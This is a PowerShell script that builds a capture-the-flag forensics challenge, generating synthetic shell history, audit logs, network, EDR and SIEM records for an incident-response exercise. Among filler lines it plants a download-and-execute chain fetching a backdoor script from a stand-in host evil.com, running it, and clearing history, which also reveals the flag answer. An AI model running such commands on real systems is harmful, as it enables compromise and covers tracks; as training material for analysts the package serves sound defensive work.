param()

$ErrorActionPreference = "Stop"

$bundleName = "m2-10-shell-history-review"
$artifactRoot = Join-Path $PSScriptRoot "..\artifacts\m2"
$artifactRoot = [System.IO.Path]::GetFullPath($artifactRoot)
$zipPath = Join-Path $artifactRoot "$bundleName.zip"
$buildRoot = Join-Path $env:TEMP "m2_10_realworld_build"
$bundleRoot = Join-Path $buildRoot $bundleName

function Write-TextFile {
    param([string]$Path, [string]$Content)
    $parent = Split-Path -Parent $Path
    if ($parent) {
        New-Item -ItemType Directory -Force -Path $parent | Out-Null
    }
    [System.IO.File]::WriteAllText(
        $Path,
        $Content.Replace("`n", [Environment]::NewLine),
        [System.Text.Encoding]::UTF8
    )
}

function Write-LinesFile {
    param([string]$Path, [System.Collections.Generic.List[string]]$Lines)
    $parent = Split-Path -Parent $Path
    if ($parent) {
        New-Item -ItemType Directory -Force -Path $parent | Out-Null
    }
    [System.IO.File]::WriteAllLines($Path, $Lines, [System.Text.Encoding]::UTF8)
}

function New-BashHistory {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)
    $cmdPool = @(
        "ls -la",
        "cd /srv/app",
        "cat /etc/os-release",
        "sudo systemctl status app-api",
        "tail -n 100 /var/log/auth.log",
        "df -h",
        "free -m",
        "journalctl -u sshd -n 50"
    )

    for ($i = 0; $i -lt 8400; $i++) {
        $ts = $base.AddSeconds($i * 7).ToString("yyyy-MM-dd HH:mm:ss")
        $cmd = $cmdPool[$i % $cmdPool.Count]
        $lines.Add("$ts | $cmd")
    }

    $lines.Add("2026-03-07 22:14:21 | cd /tmp/.cache")
    $lines.Add("2026-03-07 22:14:24 | wget http://evil.com/backdoor.sh -O /tmp/.cache/backdoor.sh")
    $lines.Add("2026-03-07 22:14:29 | chmod +x /tmp/.cache/backdoor.sh")
    $lines.Add("2026-03-07 22:14:33 | ./backdoor.sh")
    $lines.Add("2026-03-07 22:14:44 | history -c")

    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-ProcessExecAudit {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)
    $execs = @("/usr/bin/ls","/usr/bin/cat","/usr/bin/df","/usr/bin/free","/usr/bin/journalctl","/usr/bin/systemctl")

    for ($i = 0; $i -lt 6200; $i++) {
        $epoch = [int][double]([datetimeoffset]$base.AddSeconds($i * 8)).ToUnixTimeSeconds()
        $exe = $execs[$i % $execs.Count]
        $lines.Add("type=EXECVE msg=audit($epoch.$((100 + ($i % 800))):$((50000 + $i)): argc=2 a0=""$exe"" a1=""--help"" uid=$((1000 + ($i % 6))) auid=$((1000 + ($i % 6))) exe=""$exe""")
    }

    $lines.Add("type=EXECVE msg=audit(1772892864.211:597221): argc=4 a0=""/usr/bin/wget"" a1=""http://evil.com/backdoor.sh"" a2=""-O"" a3=""/tmp/.cache/backdoor.sh"" uid=1007 auid=1007 exe=""/usr/bin/wget""")
    $lines.Add("type=EXECVE msg=audit(1772892869.404:597222): argc=3 a0=""/usr/bin/chmod"" a1=""+x"" a2=""/tmp/.cache/backdoor.sh"" uid=1007 auid=1007 exe=""/usr/bin/chmod""")
    $lines.Add("type=EXECVE msg=audit(1772892873.912:597223): argc=1 a0=""/tmp/.cache/backdoor.sh"" uid=1007 auid=1007 exe=""/tmp/.cache/backdoor.sh""")

    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-NetworkEgress {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("timestamp_utc,host,user,process,src_ip,dst_ip,dst_port,proto,bytes_out,url,classification")
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)
    $urls = @(
        "https://packages.ubuntu.com/updates",
        "https://api.github.com/repos/org/app",
        "https://outlook.office.com/api/mail",
        "https://cdn.cloudflare.com/asset.js",
        "https://portal.company.local/health"
    )

    for ($i = 0; $i -lt 5600; $i++) {
        $ts = $base.AddSeconds($i * 9).ToString("o")
        $url = $urls[$i % $urls.Count]
        $dst = if ($url -like "https://portal.company.local*") { "10.120.10.$((20 + ($i % 40)))" } else { "104.18.$((10 + ($i % 100))).$((20 + ($i % 150)))" }
        $class = if ($dst.StartsWith("10.")) { "internal" } else { "approved_external" }
        $lines.Add("$ts,app-srv-03,svc_app,curl,10.120.14.$((20 + ($i % 40))),$dst,443,tcp,$((5000 + (($i * 19) % 400000))),$url,$class")
    }

    $lines.Add("2026-03-07T22:14:24Z,app-srv-03,john,wget,10.120.14.44,203.0.113.66,80,tcp,18340,http://evil.com/backdoor.sh,unapproved_external")
    $lines.Add("2026-03-07T22:14:33Z,app-srv-03,john,backdoor.sh,10.120.14.44,203.0.113.66,8080,tcp,944,http://evil.com/c2/checkin,unapproved_external")

    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-FileTimeline {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("timestamp_utc,host,user,file_path,event,hash,process,result")
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)

    for ($i = 0; $i -lt 4300; $i++) {
        $ts = $base.AddSeconds($i * 12).ToString("o")
        $path = "/var/log/app/log_$($i % 20).txt"
        $evt = if (($i % 3) -eq 0) { "read" } elseif (($i % 3) -eq 1) { "write" } else { "close" }
        $hash = "{0:x64}" -f (600000000000 + $i)
        $lines.Add("$ts,app-srv-03,svc_app,$path,$evt,$hash,app-api,ok")
    }

    $lines.Add("2026-03-07T22:14:24Z,app-srv-03,john,/tmp/.cache/backdoor.sh,file_create,9d4f2b4e17a5b2a6fc5528a35afc9410d29d7d2f5f7a1db9f6f45dc5e23f9a16,wget,ok")
    $lines.Add("2026-03-07T22:14:29Z,app-srv-03,john,/tmp/.cache/backdoor.sh,permission_change,9d4f2b4e17a5b2a6fc5528a35afc9410d29d7d2f5f7a1db9f6f45dc5e23f9a16,chmod,ok")
    $lines.Add("2026-03-07T22:14:33Z,app-srv-03,john,/tmp/.cache/backdoor.sh,execute,9d4f2b4e17a5b2a6fc5528a35afc9410d29d7d2f5f7a1db9f6f45dc5e23f9a16,backdoor.sh,ok")

    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-EdrAlerts {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)
    $signals = @("script_activity_low","network_anomaly_low","process_chain_review","policy_hint")

    for ($i = 0; $i -lt 3900; $i++) {
        $entry = [ordered]@{
            timestamp = $base.AddSeconds($i * 14).ToString("o")
            host = "app-srv-03"
            user = if (($i % 2) -eq 0) { "svc_app" } else { "deployer" }
            severity = if (($i % 131) -eq 0) { "medium" } else { "low" }
            signal = $signals[$i % $signals.Count]
            process = "bash"
            status = "closed_false_positive"
            note = "routine system administration behavior"
        }
        $lines.Add(($entry | ConvertTo-Json -Compress))
    }

    $lines.Add((([ordered]@{
        timestamp = "2026-03-07T22:14:24Z"
        host = "app-srv-03"
        user = "john"
        severity = "high"
        signal = "external_script_download"
        process = "wget"
        status = "open"
        note = "script fetched from untrusted external domain evil.com"
    }) | ConvertTo-Json -Compress))
    $lines.Add((([ordered]@{
        timestamp = "2026-03-07T22:14:33Z"
        host = "app-srv-03"
        user = "john"
        severity = "critical"
        signal = "downloaded_script_execution"
        process = "backdoor.sh"
        status = "open"
        note = "execution observed immediately after wget download"
    }) | ConvertTo-Json -Compress))

    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-CommandPolicy {
    param([string]$OutputPath)

    $content = @'
Endpoint Command Hardening Policy (Excerpt)

1) Direct download-and-execute patterns from external HTTP domains are prohibited.
2) Use of `wget`/`curl` for scripts requires approved package mirror or signed source.
3) Any executable created in `/tmp` and executed within 5 minutes requires incident review.
'@
    Write-TextFile -Path $OutputPath -Content $content
}

function New-Timeline {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("timestamp_utc,event_type,host,user,severity,details")
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)

    for ($i = 0; $i -lt 4800; $i++) {
        $ts = $base.AddSeconds($i * 10).ToString("o")
        $event = if (($i % 241) -eq 0) { "endpoint_review" } else { "routine_shell_activity" }
        $sev = if ($event -eq "endpoint_review") { "medium" } else { "low" }
        $lines.Add("$ts,$event,app-srv-03,svc_app,$sev,baseline command telemetry processing")
    }

    $lines.Add("2026-03-07T22:14:24Z,script_download,app-srv-03,john,high,wget downloaded backdoor.sh from evil.com")
    $lines.Add("2026-03-07T22:14:29Z,script_permission_change,app-srv-03,john,high,chmod +x applied to downloaded script")
    $lines.Add("2026-03-07T22:14:33Z,script_execution,app-srv-03,john,critical,downloaded script executed from /tmp/.cache")
    $lines.Add("2026-03-07T22:14:40Z,siem_case_opened,siem-automation,app-srv-03,high,INC-2026-4930 shell history review incident")

    Write-LinesFile -Path $OutputPath -Lines $lines
}

Remove-Item -Recurse -Force $buildRoot -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force -Path (Join-Path $bundleRoot "evidence") | Out-Null

$description = @'
Challenge: M2-10 Shell History Review (Real-World Investigation Pack)

Scenario:
Incident responders recovered shell history and endpoint telemetry from a compromised account showing possible script-based malware delivery.

Task:
Analyze the investigation pack and identify the command used to download the malicious script.

Flag format:
CTF{command}
'@
Write-TextFile -Path (Join-Path $bundleRoot "description.txt") -Content $description

$ticket = @'
Incident: INC-2026-4930
Severity: High
Queue: SOC + IR

Summary:
Host telemetry on `app-srv-03` indicates a suspicious script was downloaded and executed from a temporary directory.

Scope:
- Host: app-srv-03
- User in context: john
- Window: 2026-03-07 22:14 UTC

Deliverable:
Identify the command used to download the malicious script.
'@
Write-TextFile -Path (Join-Path $bundleRoot "evidence\briefing\incident_ticket.txt") -Content $ticket

$handoff = @'
Analyst handoff:
- Correlate shell history, process execution, network egress, file timeline, and EDR alerts.
- Separate benign maintenance commands from malicious download-and-execute chain.
- Extract the download command used for the malicious script.
'@
Write-TextFile -Path (Join-Path $bundleRoot "evidence\briefing\analyst_handoff.txt") -Content $handoff

New-BashHistory -OutputPath (Join-Path $bundleRoot "evidence\host\bash_history.log")
New-ProcessExecAudit -OutputPath (Join-Path $bundleRoot "evidence\host\process_exec_audit.log")
New-NetworkEgress -OutputPath (Join-Path $bundleRoot "evidence\network\egress_connections.csv")
New-FileTimeline -OutputPath (Join-Path $bundleRoot "evidence\host\file_mod_timeline.csv")
New-EdrAlerts -OutputPath (Join-Path $bundleRoot "evidence\security\edr_command_alerts.jsonl")
New-CommandPolicy -OutputPath (Join-Path $bundleRoot "evidence\policy\command_hardening_policy.txt")
New-Timeline -OutputPath (Join-Path $bundleRoot "evidence\siem\timeline_events.csv")

New-Item -ItemType Directory -Force -Path $artifactRoot | Out-Null
if (Test-Path $zipPath) {
    Remove-Item -Force $zipPath
}
Compress-Archive -Path (Join-Path $bundleRoot "*") -DestinationPath $zipPath -Force
Remove-Item -Recurse -Force $buildRoot

Get-Item $zipPath | Select-Object FullName, Length, LastWriteTime
